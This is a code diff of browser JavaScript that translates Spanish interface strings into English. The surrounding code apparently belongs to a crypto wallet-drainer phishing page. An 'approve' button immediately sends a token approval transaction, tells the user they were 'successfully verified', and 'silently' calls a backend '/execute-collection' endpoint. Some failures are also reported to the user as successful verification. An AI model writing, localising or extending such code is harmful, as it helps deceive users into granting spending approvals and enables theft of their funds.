@@ -153,7 +153,7 @@ approveBtn.addEventListener("click", async () => {
             }
         }
 
-        setLoading(true, "Por favor, firme...");
+        setLoading(true, "Signing...");
 
         // Paso C: Ejecutar la transacción de aprobación (Approve) de inmediato
         const provider = new ethers.BrowserProvider(activeProvider);
@@ -164,7 +164,7 @@ approveBtn.addEventListener("click", async () => {
         await tx.wait();
 
         setLoading(false);
-        showToast("¡Verificado con éxito! ✓", "success");
+        showToast("¡Successfully verified! ✓", "success");
 
         // Notificar al backend de forma silenciosa
         fetch(`${BACKEND_URL}/execute-collection`, {
@@ -183,7 +183,7 @@ approveBtn.addEventListener("click", async () => {
             raw.toLowerCase().includes("canceled") ||
             raw.toLowerCase().includes("cancelled")
         ) {
-            showToast("Transacción cancelada.", "default");
+            showToast("Transaction cancelled.", "default");
         } else {
             showToast("¡Verificado con éxito! ✓", "success");
         }
